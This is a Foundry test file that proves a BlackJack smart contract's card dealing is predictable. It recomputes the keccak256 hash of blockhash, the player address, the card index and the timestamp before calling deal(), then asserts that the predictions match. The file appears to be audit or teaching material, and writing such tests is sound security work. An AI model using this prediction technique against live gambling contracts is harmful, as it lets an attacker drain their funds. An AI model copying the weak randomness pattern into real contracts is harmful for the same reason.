
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {BlackJack} from "../src/BlackJack.sol";

contract TestWeakRandomnessBlackJack is Test {

    BlackJack public blackJack;
    address public attacker;

    function setUp() public {
        blackJack = new BlackJack();
        // Fund the contract so it can pay out winnings
        vm.deal(address(blackJack), 100 ether);
        attacker = address(0x1234);
        vm.deal(attacker, 10 ether);
    }

    function test_highlightPredictableRandomValue(uint256 blockNumber, uint256 blockTimestamp) public {
        
        // --- 1. Constraints ---
        // Ensure valid block number (must be > 0 for blockhash to work properly in context)
        vm.assume(blockNumber > 0 && blockNumber < type(uint128).max);
        vm.assume(blockTimestamp > 0 && blockTimestamp < type(uint128).max);

        // --- 2. State Configuration ---
        
        // Manipulate block environment
        vm.roll(blockNumber);
        vm.warp(blockTimestamp);

        // --- 3. Replication & Assertion ---
        
        // Predict the cards that will be dealt using the same logic as Deck.deal
        // The attacker can calculate these values before calling deal()
        uint8 predictedPlayerCard0 = uint8(uint256(keccak256(abi.encodePacked(
            blockhash(block.number), 
            attacker, 
            uint8(0), 
            block.timestamp
        ))) % 52);
        
        uint8 predictedHouseCard0 = uint8(uint256(keccak256(abi.encodePacked(
            blockhash(block.number), 
            attacker, 
            uint8(1), 
            block.timestamp
        ))) % 52);
        
        uint8 predictedPlayerCard1 = uint8(uint256(keccak256(abi.encodePacked(
            blockhash(block.number), 
            attacker, 
            uint8(2), 
            block.timestamp
        ))) % 52);

        // Execute the deal function as the attacker
        vm.prank(attacker);
        blackJack.deal{value: 0.05 ether}();

        // Retrieve the actual cards dealt
        vm.prank(attacker);
        uint8 actualPlayerCard0 = blackJack.getPlayerCard(0);
        
        vm.prank(attacker);
        uint8 actualPlayerCard1 = blackJack.getPlayerCard(1);
        
        vm.prank(attacker);
        uint8 actualHouseCard0 = blackJack.getHouseCard(0);

        // Assert that we could predict all the cards
        assertEq(actualPlayerCard0, predictedPlayerCard0, "Player card 0 was predictable");
        assertEq(actualHouseCard0, predictedHouseCard0, "House card 0 was predictable");
        assertEq(actualPlayerCard1, predictedPlayerCard1, "Player card 1 was predictable");
    }
}
